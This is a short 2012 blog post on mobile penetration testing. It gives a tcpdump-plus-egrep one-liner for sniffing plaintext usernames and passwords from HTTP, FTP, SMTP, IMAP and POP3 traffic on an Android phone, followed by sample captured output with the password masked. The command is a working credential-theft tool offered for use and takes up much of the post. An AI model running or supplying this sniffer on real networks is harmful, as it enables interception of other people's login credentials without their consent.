---
title: Quick and dirty tcpdump credential (username/password) sniffer
author: Jan Seidl
type: post
date: 2012-06-18T21:50:39+00:00
url: /posts/quick-and-dirty-tcpdump-credential-usernamepassword-sniffer/
categories:
  - Penetration Testing
tags:
  - android
  - arm
  - credential theft
  - dsniff
  - dug song
  - pentest
  - sniffing
  - tcpdump

---
I&#8217;ve been playing the last months with mobile pentesting within the Android platform. As I&#8217;ve been able to setup `tcpdump-arm` on my android phone, I began fooling around with it. I was trying to cross-compile Dug Song&#8217;s [dsniff][1] into `armle` architechture but it was only giving me headaches within the libnet/libnids dependencies and stuff.

So I wrote a quick one-liner to dump potential credentials (username/password) flowing in plaintext over the line:

{{< highlight bash >}}
tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
{{< /highlight >}}

And it works quite sufficiently:

{{< highlight http >}}
.{D.ezENPOST /users/register <acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1
Host: www.commandlinefu.com
...
Referer: http://www.commandlinefu.com/users/register
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 147

username=jseidl&password=MASKED&password-confirmation=MASKED&email-address=MASKED%MASKED.MASKEDhomepage=MASKED&submit=Sign+me+up
{{< /highlight >}}

Its not BY FAR efficient as dsniff, but can help out sometimes!

 [1]: http://monkey.org/~dugsong/dsniff/
